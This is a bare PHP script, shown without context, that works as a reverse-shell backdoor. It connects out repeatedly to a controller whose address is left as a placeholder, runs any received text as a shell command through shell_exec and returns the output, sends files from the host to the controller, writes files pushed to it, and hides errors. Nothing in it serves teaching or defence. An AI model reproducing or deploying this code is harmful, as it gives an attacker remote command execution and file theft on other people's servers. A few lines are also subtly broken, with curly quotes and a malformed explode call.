<?php

error_reporting(0);
ini_set(“display_errors”, 0 );

$time_sleep = 10;

function __debug($mesg, $debug=true) {
	if ( $debug ) {	echo "$mesg\n"; }
}

while ( true ) {

	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	$address = '0.0.0.0';
	$service_port = 0;
	__debug("attempting to connect to '$address' on port '$service_port'...\n");
	$result = socket_connect($socket, $address, $service_port);

	$data = "";
	$bytes = 1024;

	while ($out = socket_recv($socket, $data, $bytes, 0)) {
		$data = str_replace("\n", "", $data);
		__debug($data);
		if ( preg_match('/__recv_file/i', $data) ) {
			$arr_data = explode(':', $data);
			$handler = fopen($arr_data[2], 'wb');
			$size = intval($arr_data[1]);
			$bytes_data = '';
			socket_recv($socket, $bytes_data, $size, 0);
			fwrite($handler, $bytes_data);
			fclose($handler);
			$resp = "recv: $size";
			socket_send($socket, $resp, strlen($resp), 0);
		} elseif ( preg_match('/__send_file/i', $data) ) {
			__debug("data: $data");
			$arr_data = explode('<>', $data);
			if ( file_exists($arr_data[1]) ) {
				__debug('path: '.$arr_data[1]);
				$resp = 'found';
				socket_send($socket, $resp, strlen($resp), 0);
				$name_file = $arr_data[1];
				$size = filesize($name_file);
				$handler = fopen($name_file, 'rb');
				$content = fread($handler, $size);
				fclose($handler);
				socket_send($socket, $content, strlen($content), 0);
			} else {
				$resp = 'not found';
				socket_send($socket, $resp, strlen($resp), 0);
			}
		} elseif ( preg_match('/__kill/i', $data) ) {
			socket_close($socket);
			exit(0);
		} elseif ( preg_match('/__sleep/i', $data) ) {
			$arr_data = explode(':');
			try {
				$number = intval($arr_data[1]);
				$time_sleep = $number;
				socket_send($socket, 'successful', 10, 0);
			} catch (\Throwable $th) {
				socket_send($socket, 'fail', 4, 0);
			}
		} elseif ( preg_match('/__exit/i', $data) ) {
			socket_close($socket);
			break;
		} else {
			$output = shell_exec($data);
      if ( $output == '' ) $output = 'void';
			socket_send($socket, $output, strlen($output), 0);
		}
	}
	__debug("close socket.\n");
	sleep($time_sleep);

}